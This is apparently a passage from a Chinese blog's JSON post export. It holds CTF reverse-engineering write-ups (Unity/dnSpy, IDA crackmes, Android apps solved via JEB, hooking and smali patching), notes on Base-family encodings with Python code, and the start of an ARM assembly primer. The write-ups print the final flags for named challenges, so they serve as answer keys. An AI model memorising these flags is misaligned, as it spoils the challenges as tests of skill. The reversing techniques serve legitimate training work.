%}\n\n哎嘿！答案不就出来了？\n\n```\nflag{I_a_M_t_h_e_e_n_C_o_D_i_n_g@flare-on.com}\n```\n\n# 21. BJD hamburger competition\n\n恕我打开一脸懵逼。最后我选择看wp。这个是Unity游戏，没错，一眼看出。原来Unity游戏有个很大的漏洞啊喂！[Unity游戏逆向及破解方法介绍](https://www.52pojie.cn/thread-495115-1-1.html)\n\n看完上面那篇文章，我们都知道应该找Assembly-CSharp.dll文件。\n\n{% asset_img 21.1.png 找dll文件 %}\n\n找到它拿去dnSpy反编译，不会用dnSpy？这不就来教程了。[.Net逆向教程](https://v5le0n9.github.io/posts/784f7e1d.html)\n\n搜索游戏中的关键词，找到Spawn方法。\n\n{% asset_img 21.2.png dnSpy反编译 %}\n\n{% asset_img 21.3.png dnSpy反编译 %}\n\n{% asset_img 21.4.png dnSpy反编译 %}\n\n真的非常简单，将那一串字符串用SHA1解密后再用MD5加密，转换为大写字母取前20位即可得到flag。\n\n```\nflag{B8C37E33DEFDE51CF91E}\n```\n\n# 22. Oruga\n\n{% asset_img 22.1.png IDA分析 %}\n\n{% asset_img 22.2.png IDA分析 %}\n\n{% asset_img 22.3.png IDA分析 %}\n\n去到Hex窗口查看。\n\n{% asset_img 22.4.png IDA分析 %}\n\n所以输入应为`MEWEMEWJMEWJM`。\n\n```\nflag{MEWEMEWJMEWJM}\n```\n\n# 23. easy strcmp\n\n{% asset_img 23.1.png IDA分析 %}\n\n{% asset_img 23.2.png IDA分析 %}\n\n{% asset_img 23.3.png IDA分析 %}\n\n构造逆向脚本：\n\n```python\nb201 = [0x42,9,0x4a,0x49,0x35,0x43,0x0a,0x41,0xf0,0x19,0xe6,0x0b,0xf5,0xf2,0x0e,0x0b,0x2b,0x28,0x35,0x4a,6,0x3a,0x0a,0x4f]\nflag = list(\"********CENSORED********\")\nans = ''\nfor i in range(len(flag)):\n    ans += chr(b201[i] + ord(flag[i]))\nprint(ans)\n'''\nl3ts_m4kĳ^Ĵ^ńńSOUR_t0d4y\n'''\n```\n\n发现前一段和后一段都是正常的、有意义的字符串，但中间那段乱码了。尝试用汇编代码分析一下。\n\n{% asset_img 23.4.png IDA分析 %}\n\n{% asset_img 23.5.png IDA分析 %}\n\n这也太难看了吧，而且也只有中间那段代码出现了问题，难道我脚本错了？利用binascii模块来写脚本。\n\n有关binascii模块的主要函数：\n\n```python\nimport binascii\ndata = 'consumer'\n\n# 把数据换成二进制数据然后再用十六进制字符串表示\nb = binascii.b2a_hex(data.encode())\t#bin to ascii hex\nprint(b)\n#结果:\n#b'636f6e73756d6572'\n \n#十六进制字符格式换成原数据\nprint(binascii.a2b_hex(b))\t#ascii hex to bin\n#结果:\n#b'consumer'\n```\n\n脚本如下：\n\n```python\nimport binascii\n \nenc = \"********CENSORED********\"\nkey = [0x410A4335494A0942, 0x0B0EF2F50BE619F0, 0x4F0A3A064A35282B] \nflag = b''\t\t\t#创建一个字节型变量\n\nfor i in range(len(key)):\n    p = enc[i * 8:(i + 1) * 8][::-1]\t# 因为key是小端存储，所以enc要逆序过来进行运算\n    a = binascii.b2a_hex(p.encode('ascii'))\t# 将字符串转换成二进制形式再用十六进制字符串表示\n    b = binascii.a2b_hex(hex(int(a, 16) + key[i])[2:])[::-1] # 将a转换成十进制与key相加后再转换成十六进制形式，去掉前缀0x，转换成字节数据，再逆序输出\n    flag += b\nprint(flag.decode())\n'''\nl3ts_m4k3_4_DETOUR_t0d4y\n'''\n```\n\n所以我上面那个脚本为什么错了啊？我搞不懂，牛牛救命！\n\n","categories":["Windows逆向"],"tags":["CTF","Reverse"]},{"title":"Bugku Android逆向合集","url":"/posts/17c1c819.html","content":"\n# 1. signin\n\n运行一下程序。\n\n{% asset_img 1.png 运行程序 %}\n\n<!--more-->\n\n加载进jeb分析：\n\n{% asset_img 2.png jeb分析 %}\n\n那如何获取到flag呢？可以用hook。hook一个方法需要知道：\n\n1. 方法的包名和类名：re.sdnisc2018.sdnisc_apk1.MainActivity\n2. 方法名：getFlag\n3. 方法的参数类型：无\n\n另外还要知道程序的包名：re.sdnisc2018.sdnisc_apk1\n\n{% asset_img 3.png 编写hook代码 %}\n\nLogcat返回getFlag的返回值：\n\n{% asset_img 4.png getFlag返回值 %}\n\n随便找个可以逆序文字的网站，再拿去Base64解码，得到flag：\n\n```\n#逆序后\nZmxhZ3tIZXIzX2k1X3kwdXJfZjFhZ18zOWZiY199\n\n#Base64解码后\nflag{Her3_i5_y0ur_f1ag_39fbc_}\n```\n\n# 2. mobile1\n\n运行程序。\n\n{% asset_img 2.1.png 运行程序 %}\n\n载入jeb分析Java伪代码：\n\n{% asset_img 2.2.png jeb分析 %}\n\n{% asset_img 2.3.png jeb分析 %}\n\n```\n#Tenshine的MD5加密\nb9c77224ff234f27ac6badf83b855c76\n\n#取MD5的奇数位\nflag{bc72f242a6af3857}\n```\n\nmobile2解压后用NotePad++打开`AndroidManifest.xml`就可以看到flag。不知道在考察什么。直接将zip改成apk在模拟器上运行不了，解压后打包说缺少`apktool.yml`所以打包失败。\n\n# 3. Timer\n\n{% asset_img 3.1.png 运行程序 %}\n\n拿去AK看了一下，没有允许动态调试。一般CTF的题如果没有动态调试，说明这道题不是考动态调试so文件的，而且这道题没有输入，断也不知道在哪里断下来，断下来干嘛。那如果so文件拿去IDA看，没有Log语句的话也挺难静态分析的。所以这道题很有可能是直接修改smali文件。\n\n先jeb查看Java源码，因为重点不是so文件，所以可以暂时忽略它了：\n\n{% asset_img 3.2.png jeb分析 %}\n\n{% asset_img 3.3.png jeb分析 %}\n\n因为最后打印flag是将k作为实参传入native方法的，而k是用is2方法求出来的，所以将is2方法运行一下，求出k的值。\n\n```java\npublic class demo{\n\tpublic static boolean is2(int arg4) {\n        boolean v1 = true;\n        if(arg4 > 3) {\n            if(arg4 % 2 != 0 && arg4 % 3 != 0) {\n                int v0 = 5;\n                while(true) {\n                    if(v0 * v0 <= arg4) {\n                        if(arg4 % v0 != 0 && arg4 % (v0 + 2) != 0) {\n                            v0 += 6;\n                            continue;\n                        }\n                        return false;\n                    }\n                    else {\n                        return v1;\n                    }\n                }\n            }\n            v1 = false;\n        }\n        else if(arg4 <= 1) {\n            v1 = false;\n        }\n        return v1;\n    }\n    public static void main(String args[]){\n    \tint time=200000;\n    \tint k=0;\n    \twhile(time>0){\n\t    \tif(is2(time)){\n\t    \t\tk+=100;\n\t    \t}else{\n\t    \t\tk--;\n\t    \t}\n\t    \ttime--;\n\t    }\n    \tSystem.out.println(k);\n    }\n}\n/**\n1616384\n*/\n```\n\n在smali文件修改传入native方法的k的值为1616384，还要将输出flag的条件语句修改为小于0。\n\n{% asset_img 3.4.png 修改smali %}\n\n{% asset_img 3.5.png 修改smali %}\n\n保存，编译，安装，运行。\n\n{% asset_img 3.6.png flag %}\n\n```\nalictf{Y0vAr3TimerMa3te7}\nflag{Y0vAr3TimerMa3te7}\n```\n\n# 4. First_Mobile\n\n在模拟器上运行不了，可能是架构的问题，但这题不需要在页面上显示什么，所以运行不了也没事。\n\n载入jeb分析：\n\n{% asset_img 4.1.png jeb分析 %}\n\n{% asset_img 4.2.png jeb分析 %}\n\n调整一下encode类：\n\n```java\nclass encode {\n    private static byte[] b;\n\n    static {\n        encode.b = new byte[]{23, 22, 26, 26, 25, 25, 25, 26, 27, 28, 30, 30, 29, 30, 32, 32};\n    }\n\n    public encode() {\n        super();\n    }\n\n    public static void check(String arg7) {\n        int v6 = 16;\n        byte[] v1 = arg7.getBytes();\n        byte[] v3 = new byte[v6];\n        int i,j;\n        byte[] v5 = new byte[v6];\n        for(j=0; j<v1.length; j++)\n        {\n\t        for(i = 0; i < v6; ++i) {\n\t            v3[i] = ((byte)((v1[j] + encode.b[i]) % 61));\n\t            v3[i] = ((byte)(v3[i] * 2 - i));\n\t            if (v3[i] == v1[j])\n\t            {\n\t            \tv5[i] = v3[i];\n\n\t            }\n\t        }\n        }\n        String str = new String (v5);\n        System.out.println(str);\n    }\n}\npublic class AES_128\n{\n\n    public static void main(String[] args)\n    {\n    \tencode enc = new encode();\n    \tString arg7 = \"ABCDEFGHJIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890{}_\";\n    \tenc.check(arg7);\n    }\n}\n/**\nLOHILMNMLKHILKHI\n*/\n```\n\n所以flag为：\n\n```\nXMAN{LOHILMNMLKHILKHI}\n```\n\n# 5. easy_100\n\n虽然在模拟器不能运行，但没root的手机也可以从电脑上安装app。\n\n{% asset_img 5.1.jpg 运行程序 %}\n\n在AK中看到没有so文件，也不用动态调试。jeb分析，因为有混淆，所以看起来还挺费力。\n\n{% asset_img 5.2.png jeb分析 %}\n\n将图片用Winhex打开，144=90h，所以v=\"this_is_the_key.\"。\n\n{% asset_img 5.3.png jeb分析 %}\n\n{% asset_img 5.4.png jeb分析 %}\n\n{% asset_img 5.5.png jeb分析 %}\n\n{% asset_img 5.6.png jeb分析 %}\n\n密文与数组比较。现在理一下思路：key经过小端存储作为密钥，输入的文本串经AES_ECB模式和密钥加密后得到需要比较的数组。所以我们现在想逆向回去找文本串，需要将key转换成密钥，再利用ECB解密数组，得到flag。编写脚本：\n\n```java\npackage v5le0n9;\nimport java.io.IOException;\nimport java.security.InvalidKeyException;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.BadPaddingException;\nimport javax.crypto.Cipher;\nimport javax.crypto.IllegalBlockSizeException;\nimport javax.crypto.NoSuchPaddingException;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class demo {\n    public static void main(String[] args) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {\n        StringBuilder v1 = new StringBuilder();\n        int v0_1;\n        String v0_2;\n        String arg4 = \"this_is_the_key.\";    //在winhex中发现\n        for(v0_1 = 0; v0_1 < arg4.length(); v0_1 += 2) {  //对KEY进行二次变换，这是有类c中的函数分析得到的\n            v1.append(arg4.charAt(v0_1 + 1));\n            v1.append(arg4.charAt(v0_1));\n        }\n        v0_2 = v1.toString();\n        byte key[] = v0_2.getBytes();     //转换成Bytes数组\n        SecretKeySpec a;\n        Cipher b;\n        a = new SecretKeySpec(key, \"AES\");\n        b = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n        byte flag[] = {21, -93, -68, -94, 86, 117, -19, -68,\n                -92, 33, 50, 118, 16, 13, 1, -15, -13, 3, 4, 103, -18, 81, 30, 68, 54, -93, 44, -23,\n                93, 98, 5, 59};\n        b.init(Cipher.DECRYPT_MODE,a);    //这里注意前面的参数，选择相应的解密参数\n\n        String AES_decode = new String(b.doFinal(flag),\"utf-8\");\n        System.out.println(AES_decode);\n    }\n}\n/**\nLCTF{1t's_rea1ly_an_ea3y_ap4}\n*/\n```\n\n# 6. HelloSmali2\n\n将java文件运行一下就有答案。\n\n```\neM_5m4Li_i4_Ea5y\nXMAN{eM_5m4Li_i4_Ea5y}\n```\n\n","categories":["Android逆向"],"tags":["CTF","Reverse"]},{"title":"Base系列算法","url":"/posts/6b338c34.html","content":"\n玩着玩着CTF发现我基础太差了，很多基本原理算法都没有摸清，因为以前大多数用工具就可以解出来，所以没有太在意算法之类，但我最近遇到了一道题，它的Base64映射表换一下我就完全摸不着头脑。所以这篇笔记就来了。\n\n<!--more-->\n\n# 1. Base64\n\n将三个byte的数据，先后放入一个24bit的缓冲区中，先来的byte占高位。数据不足3byte的话，于缓冲器中剩下的bit用0补足。然后，每次取出6（因为$2^6=64$）个bit，按照其值选择索引表中的字符作为编码后的输出。不断进行，直到全部输入数据转换完成。需要注意的是，补4bit后面两个等号，补2bit后面一个等号。这样在解码时，如果有一个等号就往前删2bit无效位，两个等号往前删4bit无效位。\n\n当原数据长度不是3的整数倍时，如果最后剩下一个输入数据，在编码结果后加2个“=”；如果最后剩下两个输入数据，编码结果后加1个“=”；如果没有剩下任何数据，就什么都不要加，这样才可以保证数据还原的正确性。\n\nBase64的编码范围是`A-Za-z0-9+/`，Base64索引表：\n\n{% asset_img 1.1.png Base64索引表 %}\n\n例如“Man”：\n\n{% asset_img 1.2.png Man_Base64 %}\n\n例如“A”和“BC”：\n\n{% asset_img 1.3.png A_BC_Base64 %}\n\nPython版Base64加解密：\n\n```python\nimport base64\nimport string\n# base 字符集\nbase64_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'\n# base64_charset = \"vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/\"\n\ndef encode(origin_bytes):\n\n     # 将每⼀位bytes转换为二进制字符串，用bin转换后是0b开头的，所以把0b替换了，首位补0补齐8位\n    base64_bytes = ['{:0>8}'.format(str(bin(b)).replace('0b', '')) for b in origin_bytes]\n     \n    resp = ''\n    nums = len(base64_bytes) // 3\n    remain = len(base64_bytes) % 3     \n    integral_part = base64_bytes[0:3 * nums]\n    \n    while integral_part:\n         # 取三个字节，以每6⽐特，转换为4个整数\n         tmp_unit = ''.join(integral_part[0:3])\n         tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]\n         # 取对应base64字符\n         resp += ''.join([base64_charset[i] for i in tmp_unit])\n         integral_part = integral_part[3:]\n    \n    if remain:\n         # 补⻬三个字节，每个字节补充 0000 0000\n         remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8\n         # 取三个字节，以每6⽐特，转换为4个整数\n         # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=\n         tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]\n         resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='\n    \n    return resp\n\ndef decode(base64_str):\n    if not valid_base64_str(base64_str):\n        return bytearray()\n    \n    base64_bytes = ['{:0>6}'.format(str(bin(base64_charset.index(s))).replace('0b','')) for s in base64_str if s != '=']\n    resp = bytearray()\n    nums = len(base64_bytes) // 4\n    remain = len(base64_bytes) % 4\n    integral_part = base64_bytes[0:4 * nums]\n    \n    while integral_part:\n         # 取4个6位base64字符，作为3个字节\n         tmp_unit = ''.join(integral_part[0:4])\n         tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]]\n         for i in tmp_unit:\n            resp.append(i)\n         integral_part = integral_part[4:]\n \n    if remain:\n         remain_part = ''.join(base64_bytes[nums * 4:])\n         tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]\n         for i in tmp_unit:\n         \tresp.append(i)\n    return resp\n\ndef valid_base64_str(b_str):\n    if len(b_str) % 4:\n     \treturn False\n    for m in b_str:\n     \tif m != \"=\" and m not in base64_charset:\n     \t\treturn False\n    return True\n\nif __name__ == '__main__':\n     local_base64 = \"MDUzOTdjNDJmOWI2ZGE1OTNhMzY0NDE2MmQzNmViMDE=\"\n     print('使用本地base64解密：', decode(local_base64).decode())\n'''\n使用本地base64解密： 05397c42f9b6da593a3644162d36eb01\n'''\n```\n\n使用Python中的Base64模块加解密：\n\n```python\nimport base64\n\ns = \"你好!v5le0n9\"\n\nbs = base64.b64encode(s.encode(\"utf-8\")) # 将字符为unicode编码转换为utf-8编码\nprint(bs)\n\nbbs = str(base64.b64decode(bs), \"utf-8\")\nprint(bbs) # 解码\n\nbs = str(base64.b64encode(s.encode(\"utf-8\")), \"utf-8\")\nprint(bs) # 去掉编码结果前的 b\n\nbbs = str(base64.b64decode(bs), \"utf-8\")\nprint(bbs) # 解码\n'''\nb'5L2g5aW9IXY1bGUwbjk='\n你好!v5le0n9\n5L2g5aW9IXY1bGUwbjk=\n你好!v5le0n9\n'''\n```\n\n# 2. Base32\n\nBase32编码使用32个ASCII字符对任何数据进行编码，Base32与Base64的实现原理类似，同样是将原数据二进制形式取指定位数转换为ASCII码。首先获取数据的二进制形式，将其串联起来，每5个比特为一组进行切分($2^5=32$)，每一组内的5个比特可转换到指定的32个ASCII字符中的一个，将转换后的ASCII字符连接起来，就是编码后的数据。\n\nBase32的编码范围有两种，比较常用的是`A-Z2-7`，还有一种十六进制字符表`0-9A-V`。既然它是按5个比特切分，肯定需要填充字符，填充字符也是等号。等号可能有6个、4个、3个、1个。\n\n使用Python中的Base64模块加解密：\n\n```python\nimport base64\n\ns = \"你好v5le0n9\"\n\nbs = base64.b32encode(s.encode(\"utf-8\")) # 将字符为unicode编码转换为utf-8编码\nprint(bs)\n\nbbs = str(base64.b32decode(bs), \"utf-8\")\nprint(bbs) # 解码\n\nbs = str(base64.b32encode(s.encode(\"utf-8\")), \"utf-8\")\nprint(bs) # 去掉编码结果前的 b\n\nbbs = str(base64.b32decode(bs), \"utf-8\")\nprint(bbs) # 解码\n'''\nb'4S62BZNFXV3DK3DFGBXDS==='\n你好v5le0n9\n4S62BZNFXV3DK3DFGBXDS===\n你好v5le0n9\n'''\n```\n\n# 3. Base16\n\nBase16编码使用16个ASCII字符对任何数据进行编码，Base16与Base64的实现原理类似，同样是将原数据二进制形式取指定位数转换为ASCII码。首先获取数据的二进制形式，将其串联起来，每4个比特为一组进行切分，所以不用填充符，每一组内的4个比特可转换到指定的16个ASCII字符中的一个，将转换后的ASCII字符连接起来，就是编码后的数据。\n\nBase16依赖更小的字典，Base16编码时每4个字符为一个分组，字典的长度为$2^4=16$，字典值如下：\n\n| Value | Encoding | Value | Encoding | Value | Encoding | Value | Encoding |\n| ----- | -------- | ----- | -------- | ----- | -------- | ----- | -------- |\n| 0     | 0        | 4     | 4        | 8     | 8        | 12    | C        |\n| 1     | 1        | 5     | 5        | 9     | 9        | 13    | D        |\n| 2     | 2        | 6     | 6        | 10    | A        | 14    | E        |\n| 3     | 3        | 7     | 7        | 11    | B        | 15    | F        |\n\n使用Python中的Base64模块加解密：\n\n```python\nimport base64\n\ns = \"你好!v5le0n9\"\n\nbs = base64.b16encode(s.encode(\"utf-8\")) # 将字符为unicode编码转换为utf-8编码\nprint(bs)\n\nbbs = str(base64.b16decode(bs), \"utf-8\")\nprint(bbs) # 解码\n\nbs = str(base64.b16encode(s.encode(\"utf-8\")), \"utf-8\")\nprint(bs) # 去掉编码结果前的 b\n\nbbs = str(base64.b16decode(bs), \"utf-8\")\nprint(bbs) # 解码\n'''\nb'E4BDA0E5A5BD2176356C65306E39'\n你好!v5le0n9\nE4BDA0E5A5BD2176356C65306E39\n你好!v5le0n9\n'''\n```\n\n# 4. Base58\n\n前三种Base都是用比特切分的方法来编码与解码，而下面几种都是用辗转相除法来编码和解码的。\n\n与Base64一样，Base58编码的作用也是将非可视字符可视化（ASCII化）。但不同的是Base58编码去掉了几个看起来会产生歧义的字符，如 0 (零), O (大写字母O), I (大写的字母i) and l (小写的字母L) ，和几个影响双击选择的字符，如/, +。结果字符集正好58个字符(包括9个数字，24个大写字母，25个小写字母)。而且因为58不是2的整次幂，所以没有使用类似Base64编码中使用直接截取3个字符转4个字符（$3*8=4*6$ , 2的6次方刚好64）的方法进行转换，而是采用我们数学上经常使用的进制转换方法——辗转相除法（本质上，Base64编码是64进制，Base58是58进制）。看下Base58的编码表：\n\n{% asset_img 2.1.png Base58索引表 %}\n\n也就是字符1代表0，字符2代表1,字符3代表2...字符z代表57。然后回一下辗转相除法。\n\n如要将1234转换为58进制；\n\n第一步：1234除于58，商21，余数为16，查表得H\n\n第二步：21除于58，商0，余数为21，查表得N\n\n所以得到Base58编码为：NH\n\nPython版Base58加解密：\n\n```python\ndef b58encode(tmp:str) -> str:\n\ttmp = list(map(ord,tmp))\n\ttemp = tmp[0]\n\tbase58 = \"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\"\n\tfor i in range(len(tmp)-1):\n\t\ttemp = temp * 256 + tmp[i+1]\n\ttmp = []\n\twhile True:\n\t\ttmp.insert(0,temp % 58)\n\t\ttemp = temp // 58\n\t\tif temp == 0:\n\t\t\tbreak\n\ttemp = \"\"\n\tfor i in tmp:\n\t\ttemp += base58[i]\n\treturn temp\n\ndef b58decode(tmp:str) -> str:\n\timport binascii\n\tbase58 = \"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\"\n\ttemp = []\n\tfor i in tmp:\n\t\ttemp.append(base58.index(i))\n\ttmp = temp[0]\n\tfor i in range(len(temp)-1):\n\t\ttmp = tmp * 58 + temp[i+1]\n\treturn binascii.unhexlify(hex(tmp)[2:].encode(\"utf-8\")).decode(\"UTF-8\")\n\nprint(b58encode(\"ABDCDEFGA\"))\nprint(b58decode(\"qBLiPgShKjap\"))\n'''\nqBLiPgShKjap\nABDCDEFGA\n'''\n```\n\n# 5. Base36\n\nBase36本质上就是36进制，编码范围`0-9A-Z`，只支持整数输入。\n\nPython版Base36加解密：\n\n```python\ndef base36encode(number, alphabet='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'):\n    \"\"\"Converts an integer to a base36 string.\"\"\"\n    if not isinstance(number, (int, int)):\n        raise TypeError('number must be an integer')\n\n    base36 = ''\n    sign = ''\n\n    if number < 0:\n        sign = '-'\n        number = -number\n\n    # 如果输入的整数大于等于0小于36，直接返回索引表中的值\n    if 0 <= number < len(alphabet):\n        return sign + alphabet[number]\n\t\n    # 商，余数 = divmod(被除数，除数)\n    while number != 0:\n        number, i = divmod(number, len(alphabet))\n        base36 = alphabet[i] + base36\n\n    return sign + base36\n\ndef base36decode(number):\n    return int(number, 36)\n\nprint (base36encode(35))\nprint (base36encode(6271023))\nprint (base36decode('3QER3'))\n'''\nZ\n3QER3\n6271023\n'''\n```\n\n# 6. Base62\n\nBase62的编码范围是`0-9a-zA-Z`，同样也是按进制来编码，也是只支持输入整数。\n\nPython版Base62加解密：\n\n```python\nBASE62 = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\ndef base62encode(num, alphabet=BASE62):\n    \"\"\"Encode a positive number into Base X and return the string.\n\n    Arguments:\n    - `num`: The number to encode\n    - `alphabet`: The alphabet to use for encoding\n    \"\"\"\n    if num == 0:\n        return alphabet[0]\n    arr = []\n    arr_append = arr.append  # Extract bound-method for faster access.\n    _divmod = divmod  # Access to locals is faster.\n    base = len(alphabet)\n    while num:\n        num, rem = _divmod(num, base)\n        arr_append(alphabet[rem])\n    arr.reverse()\n    return ''.join(arr)\n\ndef base62decode(string, alphabet=BASE62):\n    \"\"\"Decode a Base X encoded string into the number\n\n    Arguments:\n    - `string`: The encoded string\n    - `alphabet`: The alphabet to use for decoding\n    \"\"\"\n    base = len(alphabet)\n    strlen = len(string)\n    num = 0\n\n    idx = 0\n    for char in string:\n        power = (strlen - (idx + 1))\n        num += alphabet.index(char) * (base ** power)\n        idx += 1\n\n    return num\n\nprint (base62encode(6271023))\nprint (base62decode('qjnx'))\n'''\nqjnx\n6271023\n'''\n```\n\n# 7. Base91\n\n下面这几种我都有点迷惑了，因为很少碰到，所以网上资料也没多少，故只是在此做个记录。\n\nBase91就是91进制，也只能是支持整数输入。\n\n{% asset_img 7.1.png Base91索引表 %}\n\n# 8. Base92\n\nBase92比Base91多了一个字符“\\~”。可支持中文、字母输入。\n\n# 9. Base85\n\nBase85 将4个字节转换为5个字节，数据的增加率为25%，而Base64的数据增加率为33%。用85进制的方式对照ASCII码表进行加密。\n\n{% asset_img 9.1.png Base85索引表 %}\n\n使用Python中的Base64模块进行加解密：\n\n```python\nimport base64\n\ns = \"你好!v5le0n9\"\n\nbs = base64.b85encode(s.encode(\"utf-8\")) # 将字符为unicode编码转换为utf-8编码\nprint(bs)\n\nbbs = str(base64.b85decode(bs), \"utf-8\")\nprint(bbs) # 解码\n\nbs = str(base64.b85encode(s.encode(\"utf-8\")), \"utf-8\")\nprint(bs) # 去掉编码结果前的 b\n\nbbs = str(base64.b85decode(bs), \"utf-8\")\nprint(bbs) # 解码\n'''\nb'<h`KfrM)3`HEd-tZaD'\n你好!v5le0n9\n<h`KfrM)3`HEd-tZaD\n你好!v5le0n9\n'''\n```\n\n","categories":["算法"],"tags":["Python"]},{"title":"ARM汇编语言","url":"/posts/6d8340c1.html","content":"\n做题知识不够用，我又来学习了。\n\n<!--more-->\n\nARM指令集机器编码基本格式：\n\n| 31-28  | 27-20  | 19-16      | 15-12         | 11-0    |\n| ------ | ------ | ---------- | ------------- | ------- |\n| 条件码 | 指令码 | 目的寄存器 | 操作数1寄存器 | 操作数2 |\n\n{% asset_img 条件码.png 条件码 %}\n\n# 1. 寻址方式\n\n## 1.1 立即寻址\n\n操作数包含在指令的32位机器编码中。`#`表示立即数。\n\n```asm\nADD R0,R0,#1\t\t;R0 <- R0 + 1\nAND R8,R7,#0xFF\t\t;R8 <- R7 AND 0xFF\n```\n\n问题：32位长立即数的编码问题(合法性问题)\n\n原因：在指令中，立即数作为操作数2出现，编码格式中仅安排了12位，32位立即数不能直接编码。\n\n解决：12位编码包括8位常数和4位循环右移值，由8位常数循环右移4位值的2倍得到最后的32位立即数。\n\n例：MOV R0,#0x0000F200\n\n机器代码：E3A00CF2\n\n机器代码含义：E表示无条件，3A是MOV的机器码，00表示R0寄存器，C是4位循环右移值，F2是8位常数。\n\n方法：0xF2循环右移12*2=24位得到原32位数值\n\n| 移位前： |      |      |      |      |      |      |      |\n| -------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 0000     | 0000 | 0000 | 0000 | 0000 | 0000 | 1111 | 0010 |\n| 移位后： |      |      |      |      |      |      |      |\n| 0000     | 0000 | 0000 | 0000 | 1111 | 0010 | 0000 | 0000 |\n\n## 1.2 寄存器寻址\n\n操作数存放在寄存器中。\n\n### 1.2.1 基本方式\n\n```asm\nADD R0,R1,R2\t;R0 <- R1 + R2\n```\n\n### 1.2.2 对第二操作数寄存器的移位操作\n\n```asm\nADD R3,R2,R1,LSR #2\t\t;R3 <- R2 + R1 / 4\n```\n\n移位方式：\n\n| 移位方式 | 含义                                                         |\n| -------- | ------------------------------------------------------------ |\n| LSL      | 逻辑左移(乘)                                                 |\n| LSR      | 逻辑右移(除)                                                 |\n| ASL      | 算术左移，和LSL一样。类似于小数点移位，左移数变小            |\n| ASR      | 算术右移，分正负来填充右移后的空余位，右移数变大             |\n| ROR      | 循环右移                                                     |\n| RRX      | 带扩展的循环右移，循环右移1位后左端用C填充，这种方式只移位1位，所以无需指定移位位数 |\n\n### 1.2.3 寄存器间接寻址\n\n利用寄存器的值作为存储器指针，数据传送类的load/store类指令都使用寄存器间接寻址方式。\n\n```asm\nLDR R0,[R1]\t\t;R0 <- mem32[R1]\nSTR R0,[R1]\t\t;mem32[R1] <- R0\n```\n\n### 1.2.4 基址加偏移地址\n\n```asm\n前变址\nLDR R0,[R1,#4]\t\t;R0 <- mem32[R1+4]\n\n自动变址\nLDR R0,[R1,#4]!\t\t;R0 <- mem32[R1+4]\n\t\t\t\t\t;R1 <- R1 + 4\n\t\t\t\t\t\n后变址\nLDR R0,[R1],#4\t\t;R0 <- mem32[R1]\n\t\t\t\t\t;R1 <- R1 + 4\n\t\t\n寄存器偏移地址\nLDR R0,[R1,R2]\t\t;R0 <- mem32[R1+R2]\nLDR R0,[R1,R2,LSL #2]\t;R0 <- mem32[R1+R2*4] \n```\n\n## 1.3 多寄存器及块拷贝寻址\n\n一条指令完成多字数据或数据块的传送。\n\n基本指令：LDM/STM\n\n| 基址寄存器变化方式 | 含义               |\n| ------------------ | ------------------ |\n| IA                 | 操作完后地址递增   |\n| IB                 | 地址先增后完成操作 |\n| DA                 | 操作完后地址递减   |\n| DB                 | 地址先减后完成操作 |\n\n多寄存器语法表示：多寄存器用`{}`包含，连续寄存器使用`-`间隔，不连续的用`,`分隔。\n\n例1：\n\n```asm\nLDMID R0,{R1-R4,R6}\t;R1=[R0],R2=[R0+4],...,R6=[R0+16]\n```\n\nR0作为基址寄存器，其值可自动更新：\n\n```asm\nLDMID R0!,{R1-R4,R6}\n```\n\n例2：\n\nLDM指令和STM指令配合实现数据块拷贝：\n\n```asm\nLDMIA R0,{R1-R5}\t;以R0为基址读取五字存储单元数据加载至R1-R5\nSTMIA R6,{R1-R5}\t;将R1-R5中数据依次存入R6为起始地址的存储单元\n```\n\n## 1.4 堆栈寻址\n\n存储空间中的数据栈与寄存器组之间的批量数据传输，采用R13(SP)作为堆栈指针，采用FILO(先进后出)的方式工作，**SP指向栈顶**。\n\n基本指令：LDM/STM\n\n堆栈组织生成方式：\n\nFD/ED：满递减/空递减\n\nFA/EA：满递增/空递增\n\n```asm\nSTMFD SP!,{R0-R7,LR}\t;入栈\nLDMFD SP!,{R0-R7,LR}\t;弹出堆栈\n```\n\n先将LR入栈，最后才是R0入栈；先R0出栈，最后LR出栈。\n\nFD相当于多寄存器寻址的DB。\n\n事实上，堆栈寻址与多寄存器寻址均可操作堆栈，在需要保存特定某些寄存器值时，采用STM进行压栈，采用LDM操作弹出堆栈。\n\n```asm\n保存数据\nSTMDB SP!,{R0-R12,LR}\n\n弹出数据\nLDMIA SP!,{R0-R12,LR}\n```\n\n## 1.5 相对寻址\n\n将程序计数器PC作为基址寄存器，指令中的地址标号字段作为偏移量进行寻址，跳转指令采用相对寻址方式。\n\n# 2. ARM指令集\n\n## 2.1 存储器访问(L/S)指令\n\n常规：\n\n```asm\nLDR R2,[R5]\t\t\t\t;将R5为地址的存储单元中数据加载至R2（读）\nSTR R1,[R0,#0X04]\t\t;mem32[R0+4] <- R1（写）\n```\n\n 传送数据类型：\n\n```asm\nLDRB R3,[R2],#1\t\t;以R2为地址读取1字节数据至R3，R2 = R2 + 1\nSTRH R1,[R0,#2]!\t;半字传送，传送R1中低2字节数据至R0+2为地址的存储单元，R0更新\n```\n\n多寄存器补充：在非用户或系统模式下，可出现`^`后缀，若LDM指令寄存器列表中包含PC，则会额外将SPSR拷贝。\n\n## 2.2 